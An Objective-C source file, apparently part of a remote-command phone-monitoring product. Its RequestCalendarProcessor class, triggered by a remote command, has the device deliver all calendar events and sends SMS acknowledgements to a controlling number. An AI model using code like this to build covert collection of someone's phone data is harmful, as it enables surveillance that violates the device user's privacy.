/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestCalendarProcessor
 - Version      :  1.0  
 - Purpose      :  Capture all calendar events
 - Copy right   :  13/12/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestCalendarProcessor.h"
#import "CalendarManager.h"


@interface RequestCalendarProcessor (private)
- (void) processRequestCalendar;
- (void) requestCalendarException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
- (void) deliverCalendarDidFinished: (NSError *) aError;
@end


@implementation RequestCalendarProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestCalendarProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> RequestCalendarProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method


/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestCalendarProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestCalendarProcessor--->doProcessingCommand")	
	[self processRequestCalendar];
}


#pragma mark Private method


/**
 - Method name:			processRequestCalendar
 - Purpose:				This method is used to process Request Calendar
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestCalendar {
	DLog (@"RequestCalendarProcessor ---> processRequestCalendar")
	id <CalendarManager> calendarManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mCalendarManager];
	BOOL isReady = [calendarManager deliverCalendar:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request calendar command")
		[self requestCalendarException];
	} else {
		DLog (@".... processing request calendar command")
		[self acknowldgeMessage];		
	}
}

/**
 - Method name:			requestCalendarException
 - Purpose:				This method is invoked when it fails to send Calendar
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestCalendarException {
	DLog (@"RequestCalendarProcessor ---> requestCalendarException");
	FxException* exception = [FxException exceptionWithName:@"RequestCalendarException" andReason:@"Request calendar error"];
	[exception setErrorCode:kCalendarManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	DLog (@"RequestCalendarProcessor ---> acknowldgeMessage");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestCalendarMSG1", @"")];
	DLog (@"ackMessage %@" , ackMessage)
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestCalendarProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request calendar process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestCalendarProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol CalendarDelegate
- (void) calendarDidDelivered: (NSError *) aError {
	DLog (@"!!!!!!! RequestCalendarProcessor ---> calendarDidDelivered")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestRunningAppMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestCalendarMSG2", @"")];		
		[self sendReplySMS:requestRunningAppMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}

- (void) dealloc {
	[super dealloc];
}

@end
